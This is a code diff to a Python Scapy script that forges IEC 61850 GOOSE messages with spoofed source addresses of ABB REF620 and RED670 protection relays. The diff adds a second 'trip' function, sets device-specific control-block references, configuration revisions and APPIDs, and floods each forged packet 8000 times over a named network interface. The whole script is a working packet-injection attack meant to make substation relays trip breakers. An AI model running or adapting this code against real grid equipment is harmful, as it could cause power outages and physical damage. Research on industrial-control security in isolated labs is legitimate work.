@@ -3,6 +3,9 @@ from scapy.layers.ntp import TimeStampField
 import datetime
 from binascii import unhexlify
 
+INTERFACE = "Intel(R) Ethernet Connection (4) I219-V"
+PACKET_QTY = 8000
+
 
 def num2str(num):
     bytestring = bytearray()
@@ -68,29 +71,53 @@ class GoosePDU(Packet):
 
 
 def ref620_trip():
-    ethernet_mac = Ether(src='00:21:c1:50:52:95', dst='01:0c:cd:01:00:00',type=0x88b8)
-    vlan = Dot1Q(type=0x88b8, prio=4, id=0, vlan=99)
-    goose_pdu = GoosePDU(gocbRef="ABBREF620LD0/LLN0$GO$gcbTRIP",
-                         timeAllowedtoLive=num2str(11000),
-                         datSet="ABBREF620LD0/LLN0$TRIP",
-                         goID="ABBREF620LD0/LLN0.gcbTRIP",
+    ethernet_mac = Ether(src='00:21:c1:50:52:95', dst='01:0c:cd:01:00:01', type=0x88b8)
+    goose_pdu = GoosePDU(gocbRef="ABBREF620LD0/LLN0$GO$Control_DataSet",
+                         timeAllowedtoLive=num2str(2200),
+                         datSet="ABBREF620LD0/LLN0$Dataset_GOOSE",
+                         goID="ABBREF620/LD0/LLN0/Control_DataSet",
                          T=datetime.datetime.now(datetime.timezone.utc).timestamp(),
-                         stNum=num2str(1),
-                         sqNum=num2str(1),
+                         stNum=num2str(444),
+                         sqNum=num2str(0),
                          simulation=0,
-                         confRev=num2str(1),
+                         confRev=num2str(20400),
                          ndsCom=0,
-                         numDatSetEntries=num2str(1)
+                         numDatSetEntries=num2str(2)
                          )
     goose_data = unhexlify("ab088301018403030000")
     goose_pdu.sequence_l = (len(goose_pdu)+len(goose_data)-2)
-    goose_header = GooseHeader(length=len(goose_pdu)+len(goose_data))
-    goose_packet = ethernet_mac/goose_header/goose_pdu/goose_data
-    sendp(goose_packet, iface="Intel(R) Ethernet Connection (4) I219-V")
+    goose_header = GooseHeader(appid=12289, length=len(goose_pdu)+len(goose_data)+8)
+    goose_packet = ethernet_mac / goose_header / goose_pdu / goose_data
+    for i in range(PACKET_QTY):
+        sendp(goose_packet, iface=INTERFACE)
+    return "DONE"
+
+
+def red670_trip():
+    ethernet_mac = Ether(src='00:00:23:2d:24:05', dst='01:0c:cd:01:00:00', type=0x88b8)
+    goose_pdu = GoosePDU(gocbRef="ABBRED670LD0/LLN0$GO$gcbGOOSE",
+                         timeAllowedtoLive=num2str(11000),
+                         datSet="ABBRED670LD0/LLN0$GOOSE",
+                         goID="ABBRED670LD0/LLN0.gcbGOOSE",
+                         T=datetime.datetime.now(datetime.timezone.utc).timestamp(),
+                         stNum=num2str(1),
+                         sqNum=num2str(0),
+                         simulation=0,
+                         confRev=num2str(100),
+                         ndsCom=0,
+                         numDatSetEntries=num2str(2)
+                         )
+    goose_data = unhexlify("ab088301018403030000")
+    goose_pdu.sequence_l = (len(goose_pdu) + len(goose_data) - 2)
+    goose_header = GooseHeader(appid=12290, length=len(goose_pdu) + len(goose_data)+8)
+    goose_packet = ethernet_mac / goose_header / goose_pdu / goose_data
+    for i in range(PACKET_QTY):
+        sendp(goose_packet, iface=INTERFACE)
     return "DONE"
 
 
 if __name__ == '__main__':
     print("GOOSE packet for Scapy by Sever Sudakov")
     ref620_trip()
+    red670_trip()
 
